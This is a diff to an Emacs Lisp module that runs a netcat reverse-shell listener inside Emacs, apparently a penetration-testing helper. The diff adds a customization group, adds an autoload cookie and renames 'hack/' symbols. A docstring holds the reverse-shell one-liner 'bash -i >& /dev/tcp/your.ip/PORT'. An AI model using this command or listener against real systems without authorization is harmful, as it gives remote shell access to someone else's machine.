@@ -19,6 +19,13 @@
 
 ;;; Code:
 (require 'comint)
+
+(defgroup cybel-revshell nil
+  "Cybel Reverse shell subgroup."
+  :group 'cybel
+  :prefix "cybel-revshell*"
+  :link '(url-link :tag "Github" "https://github.com/VincentRavera/Cybel"))
+
 (defvar cybel-revshell-executable "nc"
   "Reverse shell executable.")
 
@@ -33,9 +40,10 @@
 (defvar cybel-revshell-prompt-regexp "^[a-zA-Z0-9@:\\ $#]"
   "Reverse shell possible prompt.")
 
+;;;###autoload
 (defun cybel-revshell (port)
   "Run a reverse shell listener on PORT inside Emacs.
-Run `hack/cybel-revshell' function and execute bash -i >& /dev/tcp/your.ip/PORT."
+Run `cybel-revshell' function and execute bash -i >& /dev/tcp/your.ip/PORT."
   (interactive "nPort Number: ")
   (let* ((cybel-revshell-program cybel-revshell-executable)
          (cybel-revshell-parameters (append cybel-revshell-parameters '("p") (list (int-to-string port))))
@@ -59,7 +67,7 @@ Run `hack/cybel-revshell' function and execute bash -i >& /dev/tcp/your.ip/PORT.
 (define-derived-mode cybel-revshell-mode comint-mode "revshell"
   "Major mode for `cybel-revshell'.
 
-\\<hack/cybel-revshell-mode-map>"
+\\<cybel-revshell-mode-map>"
   nil "cybel-revshell"
   (set (make-local-variable 'comint-prompt-regexp) cybel-revshell-prompt-regexp)
   (set (make-local-variable 'comint-prompt-read-only) t)
@@ -67,7 +75,7 @@ Run `hack/cybel-revshell' function and execute bash -i >& /dev/tcp/your.ip/PORT.
   ;; (set (make-local-variable 'font-lock-defaults) "\\'")
   (set (make-local-variable 'paragraph-start) cybel-revshell-prompt-regexp))
 
-(add-hook 'cybel-revshell-mode-hook 'hack/revshell--initialize)
+(add-hook 'cybel-revshell-mode-hook 'cybel-revshell--initialize)
 
 
 (provide 'cybel-revshell)
